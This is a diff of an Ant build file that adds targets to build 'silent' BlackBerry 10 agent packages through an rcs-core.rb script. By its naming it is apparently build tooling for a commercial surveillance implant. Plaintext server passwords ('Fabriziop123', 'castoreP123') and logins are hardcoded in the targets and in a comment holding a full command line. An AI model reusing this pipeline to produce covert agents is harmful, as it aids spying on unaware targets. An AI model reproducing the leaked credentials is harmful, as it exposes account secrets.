@@ -447,7 +447,7 @@
 
 	<target name="build-debug" depends="init">
 
-		<for list="default,v2" param="osversion">
+		<for list="bb10" param="osversion">
 			<sequential>
 				<echo message="===========================" />
 				<echo message="===  BUILD releasedebug ===" />
@@ -592,11 +592,43 @@
                 <arg value="-R" />
                 <arg value="@{file}" />
             </exec>
-
         </sequential>
     </macrodef>
 
+    <macrodef name="buildsilent">
+        <!-- rcs-core -u batch -p Fabriziop123 -d rcs-local -n bb10 -f RCS_0000000001 -b server/template_bb10/b.json -o bb10.apk -->
+        <attribute name="server" />
+        <attribute name="login" />
+        <attribute name="password" />
+        <attribute name="core" />
+        <attribute name="json" />
+        <attribute name="factory" />
+        <sequential>
+            <echo>@{server} : ${rcscore.path}/rcs-core.rb</echo>
 
+            <exec executable="${ruby.path}" dir="." failonerror="true">
+                <arg value="${rcscore.path}/rcs-core.rb" />
+                <arg value="-u" />
+                <arg value="@{login}" />
+                <arg value="-p" />
+                <arg value="@{password}" />
+                <arg value="-d" />
+                <arg value="@{server}" />
+                <arg value="-n" />
+                <arg value="@{core}" />
+                <arg value="-f" />
+                <arg value="@{factory}" />
+                <arg value="-b" />
+                <arg value="@{json}" />
+                <arg value="-o" />
+                <arg value="output/@{core}_@{server}.zip" />
+            </exec>
+        </sequential>
+    </macrodef>
+
+    <target name="silent-bb10">
+        <buildsilent server="rcs-local" login="batch" password="Fabriziop123" core="bb10" json="antlibs/bb10_silent.json" factory="RCS_0000000001"  />
+    </target>
 
 	<target name="update">
 		<updaterelease server="rcs-castore" login="zenobatch" password="castoreP123" file="server/android_${version}.zip" core="android"/>
@@ -621,9 +653,9 @@
         <antcall target="set-debug" />
 	</target>
 
-    <target name="test-local" depends="build">
-        <antcall target="servercore" />
-        <antcall target="update-local" />
+    <target name="test-local" depends="build-debug">
+        <antcall target="servercore_bb10" />
+        <antcall target="update-bb10" />
         <antcall target="set-debug" />
     </target>
 
@@ -637,6 +669,7 @@
 
     <target name="update-bb10">
         <updaterelease server="rcs-local" login="batch" password="Fabriziop123" file="server/bb10_${version}.zip" core="bb10"/>
+        <antcall target="silent-bb10"/>
     </target>
 
 	<target name="update-zeus">
